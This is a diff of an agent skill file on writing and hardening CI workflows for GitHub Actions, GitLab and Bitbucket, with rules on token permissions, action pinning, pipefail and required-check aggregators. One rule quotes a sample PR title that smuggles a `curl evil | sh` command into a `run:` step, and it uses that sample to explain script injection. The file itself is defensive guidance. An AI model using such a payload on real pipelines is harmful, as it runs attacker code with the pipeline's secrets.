@@ -1,149 +1,91 @@
 ---
 name: configure-ci-cd-pipelines
 description: >-
-  Writes, reviews, and debugs GitHub Actions, GitLab CI, and Bitbucket
-  Pipelines, covering permissions, script injection, pinned actions, and
-  deploys. Use when editing pipeline YAML or CI fails.
+  Writes and hardens GitHub Actions and other CI workflows, including
+  triggers, caching, matrices, pinned actions, and token permissions. Use
+  when a pipeline is added, slow, failing, or unsafe.
 ---
 
 # Configure CI/CD Pipelines
 
-Change a pipeline so that it runs the right commit with the least
-privilege. Required checks must fail when their jobs fail, and deploys
-must use the artifact that was tested.
-
-## Workflow
-
-1. Read the existing pipeline files, the repository's build and test
-   commands, and the branch protection or required checks if they are
-   visible. Name the provider and, for GitHub Enterprise Server, its
-   version.
-1. Write down, for the change:
-   - which events and refs run it, and which commit each one tests
-     ([events][events]);
-   - which jobs need which permissions and secrets;
-   - which result gates the merge.
-1. Edit, using the cards for:
-   - workflow-level `permissions: contents: read`;
-   - event data through `env:`;
-   - actions pinned by SHA, with a version comment;
-   - `persist-credentials: false`;
-   - `shell: bash` for any pipe;
-   - an aggregator for required checks;
-   - `timeout-minutes` on every job;
-   - OIDC only in the deploy job.
-1. Run the linters: `actionlint`,
-   `python3 scripts/check_action_pins.py .github`,
-   `uvx zizmor@1.30.1 --offline .github/workflows`. For GitLab and
-   Bitbucket, run `uvx check-jsonschema@0.38.2 --builtin-schema
-   vendor.gitlab-ci|vendor.bitbucket-pipelines FILE`.
-1. Run changed scripts locally with the runner's shell flags
-   ([local reproduction][local]).
-1. Report the lint output, the local runs, and what only a hosted run
-   can show: secrets, approvals, required checks, and runner
-   availability.
-
-## Route the task to a card
-
-| Task or symptom | Card |
-| --- | --- |
-| Required check stuck pending | [Events][events], [selection before execution][selection] |
-| Fork PRs need labels or comments | [pull_request_target][prt] |
-| Token can push or publish from tests | [Permissions][perms] |
-| PR title or branch name in `run:` | [Injection][injection] |
-| `uses: x@v1` | [Pinning][pinning] |
-| Step green although tests failed | [Shell and pipefail][pipefail] |
-| Many matrix jobs as required checks | [Aggregator][aggregator] |
-| Superseded runs or overlapping deploys | [Concurrency][concurrency], [GitLab interruptible][gl-int] |
-| Build output missing in the next job | [Artifacts][artifacts], [GitLab needs][gl-needs], [Bitbucket steps][bb-steps] |
-| Cloud deploy credentials | [GitHub OIDC][oidc], [GitLab id_tokens][gl-deploy], [Bitbucket OIDC][bb-deploy] |
-| Duplicate GitLab pipelines | [Workflow rules][gl-rules] |
-| Manual job does not block | [allow_failure][gl-manual] |
-| Branch not running in Bitbucket | [Start conditions][bb-start] |
-| Deploy rebuilds the code | [Build once][build-once] |
-| Attestations or SBOM requested | [Provenance][provenance] |
-| Slow dependency installs | [Cache keys][cache] |
+Change a pipeline so it runs the intended commit with the least privilege,
+its required checks fail when their jobs fail, and deploys ship the tested
+artifact. The rules below are the mistakes agents make in pipeline YAML.
 
 ## Rules
 
-- Never run PR code in a job that has secrets or write tokens:
-  `pull_request_target`, `workflow_run`, or a protected-variable job.
-- Pass attacker-controlled values through `env:` and quoted variables,
-  never through `${{ }}` inside `run:`.
-- Pin third-party actions to a commit SHA with a `# vX.Y.Z` comment,
-  and check the comment with `check_action_pins.py --resolve`.
-- Make workflow permissions read-only. Grant write or `id-token` scopes
-  only to the job that needs them.
-- Do not use `continue-on-error`, `allow_failure: true`, `|| true`, or
-  a pipe without pipefail on a required check.
-- A required-check aggregator fails on `failure`, `cancelled`, and
-  unexpected `skipped`.
-- Deploy the tested artifact, identified by its digest. Never rebuild
-  for production.
+- Do not check out PR code in a job that has secrets or a write token:
+  `pull_request_target`, `workflow_run`, or a protected-variable job. Run
+  `zizmor .github/workflows` and justify every `dangerous-triggers`
+  finding. Use `pull_request` to build or test a fork PR, because forks get
+  no secrets there.
+- Never put `${{ }}` with event data inside `run:`. Pass it through
+  `env:` and quote `"$VAR"`: a PR title such as `a"; curl evil | sh; "`
+  runs as code otherwise. `actionlint` and zizmor `template-injection`
+  catch this.
+- Pin third-party actions and reusable workflows to a full 40-hex SHA
+  with a `# vX.Y.Z` comment, because tags can be moved. Check with zizmor
+  (`unpinned-uses`, `ref-version-mismatch`); resolve a tag with
+  `gh api repos/OWNER/REPO/commits/TAG --jq .sha`. Local `./` actions and
+  `docker://...@sha256:` digests are fine.
+- Set `permissions: contents: read` at workflow level and raise scopes
+  only on the job that needs them. Specifying any permission sets every
+  unlisted scope to `none`. Put `id-token: write` only on the deploy job,
+  and restrict the repo, ref or environment, and audience in the cloud
+  trust policy; the permission alone restricts nothing.
+- Set `persist-credentials: false` on `actions/checkout` in jobs that do
+  not push, so later steps and uploaded artifacts cannot read the token
+  (zizmor `artipacked`).
+- Do not add `paths` or `branches` filters to a workflow that provides a
+  required check: a filtered-out workflow never reports and the check
+  stays pending. Add `merge_group:` if a merge queue is used.
+- On Linux and macOS runners, a `run:` with a pipe needs `shell: bash` or
+  `set -o pipefail`. Without `shell:`, GitHub runs `bash -e {0}` and
+  `test | tee log` exits 0 when `test` fails. `shell: sh` has the same
+  flaw. Windows runners default to `pwsh`, which fails only on the last
+  command's exit code; read environment variables through
+  PowerShell's `env:` drive there.
+- Do not use `continue-on-error`, `|| true`, or GitLab
+  `allow_failure: true` on a required check.
+- For many matrix legs or conditional jobs, require one aggregator job
+  with `needs: [...]` and `if: ${{ always() }}`. Fail it unless each
+  `needs.X.result` is `success`, or `skipped` where a skip is intended.
+  `cancelled` and `failure` must fail it; a skipped aggregator counts as
+  passing for branch protection.
+- Key caches on everything that changes the content: OS, architecture,
+  tool version, and lockfile hash (`hashFiles('**/package-lock.json')`).
+  Never let a privileged job restore a cache written by an untrusted run.
+  Measure that downloads dominate before adding one, because a cache never
+  replaces a check.
+- Use `concurrency: group: ${{ github.workflow }}-${{ github.head_ref ||
+  github.ref }}` with `cancel-in-progress` only for PR runs. Never cancel
+  a deploy or migration midway: use `cancel-in-progress: false` there.
+- Set `timeout-minutes` on every job (default 360) and `fail-fast: false`
+  on matrices whose legs are each useful.
+- Build once and deploy the same artifact by digest. Never rebuild for
+  production. Record the source SHA and producing run with it.
+- `upload-artifact` v4+: names are unique per run, so matrix legs need
+  distinct names. Set `if-no-files-found: error`; the default `warn`
+  hands the next job nothing. GitHub Enterprise Server does not support
+  v4+ artifact actions, so ask for its version.
+- Reproduce a failing build or test step locally with the runner's shell
+  flags, image, and directory; never rerun deploy, publish, or migration
+  steps.
 
-## Bundled tools
+## Scripts
 
-- `scripts/check_action_pins.py PATH... [--resolve]` reports
-  `uses:` references that are not SHA-pinned. `--resolve` checks
-  version comments against `gh api`. `test_check_action_pins.py` holds
-  its tests.
-- `assets/examples/github/good/` is the reference workflow, with
-  `ci/all-green.sh`, `ci/test.sh`, and `ci/deploy.sh`.
-  `github/bad/` has one of each defect.
-- `assets/examples/gitlab/.gitlab-ci.yml` and
-  `bitbucket/bitbucket-pipelines.yml`, plus a deliberately broken
-  variant of each.
-- `sh assets/examples/verify.sh [network]` checks the reference
-  workflows. Offline, it runs actionlint 1.7.12, the pin checker, the
-  aggregator truth table, and the runner's shell flags. `network` adds
-  zizmor 1.30.1, check-jsonschema 0.38.2, and SHA resolution with `gh`.
+No bundled scripts. Lint every GitHub change with `actionlint` and
+`zizmor .github/workflows`. For GitLab and Bitbucket use
+`check-jsonschema --builtin-schema vendor.gitlab-ci FILE` or
+`vendor.bitbucket-pipelines FILE`. The Bitbucket schema accepts a step
+with `scripts:` instead of `script:`, so read the file too.
+
+Linters cannot show secrets, approvals, required checks, runner
+availability, or cloud trust. List those as not verified.
 
 ## References
 
-- [GitHub Actions](references/github-actions.md)
-- [GitLab CI and Bitbucket Pipelines](references/gitlab-and-bitbucket.md)
-- [Delivery across providers](references/delivery.md)
-
-## Completion evidence
-
-- The changed files, with lint output: actionlint, the pin checker,
-  zizmor, or check-jsonschema.
-- The event-to-commit and job-to-permission table for the change.
-- Local runs of changed scripts with the runner's shell flags, and the
-  aggregator truth table if it changed.
-- A list of what needs a hosted run, each marked not run: required
-  checks, secrets, approvals, and OIDC trust. Linters and local runs do
-  not verify hosted behavior.
-
-## Stop and ask
-
-- The change needs secrets or write permissions in a job that runs PR
-  code.
-- Branch protection or required-check names must change, and you
-  cannot see the settings.
-- The provider is GitHub Enterprise Server, where the v4+ artifact
-  actions are not supported, and the server version is unknown.
-
-[events]: references/github-actions.md#event-selection-and-the-tested-commit
-[prt]: references/github-actions.md#pull_request_target-and-workflow_run
-[perms]: references/github-actions.md#least-privilege-token-permissions
-[injection]: references/github-actions.md#expression-injection
-[pinning]: references/github-actions.md#action-pinning-to-commit-shas
-[pipefail]: references/github-actions.md#runner-shell-and-pipefail
-[aggregator]: references/github-actions.md#required-check-aggregator
-[concurrency]: references/github-actions.md#concurrency-groups
-[artifacts]: references/github-actions.md#artifacts-between-jobs
-[oidc]: references/github-actions.md#oidc-deployment-job
-[gl-rules]: references/gitlab-and-bitbucket.md#gitlab-one-pipeline-per-change-with-workflow-rules
-[gl-needs]: references/gitlab-and-bitbucket.md#gitlab-needs-and-artifacts
-[gl-manual]: references/gitlab-and-bitbucket.md#gitlab-manual-jobs-and-allow_failure
-[gl-deploy]: references/gitlab-and-bitbucket.md#gitlab-deployment-with-id_tokens-and-resource_group
-[gl-int]: references/gitlab-and-bitbucket.md#gitlab-interruptible-and-auto-cancel
-[bb-start]: references/gitlab-and-bitbucket.md#bitbucket-start-conditions
-[bb-steps]: references/gitlab-and-bitbucket.md#bitbucket-step-isolation-artifacts-and-anchors
-[bb-deploy]: references/gitlab-and-bitbucket.md#bitbucket-manual-oidc-deployment
-[selection]: references/delivery.md#selection-before-execution
-[build-once]: references/delivery.md#build-once-promote-the-same-artifact
-[provenance]: references/delivery.md#provenance-and-sbom
-[cache]: references/delivery.md#cache-keys-and-cache-trust
-[local]: references/delivery.md#local-reproduction-of-a-failing-step
+- Read [GitHub Actions](references/github-actions.md) when writing the
+  event triggers, `pull_request_target`, OIDC deploy, or aggregator YAML.
+- Read [GitLab and Bitbucket](references/gitlab-and-bitbucket.md) when
+  the pipeline is `.gitlab-ci.yml` or `bitbucket-pipelines.yml`.
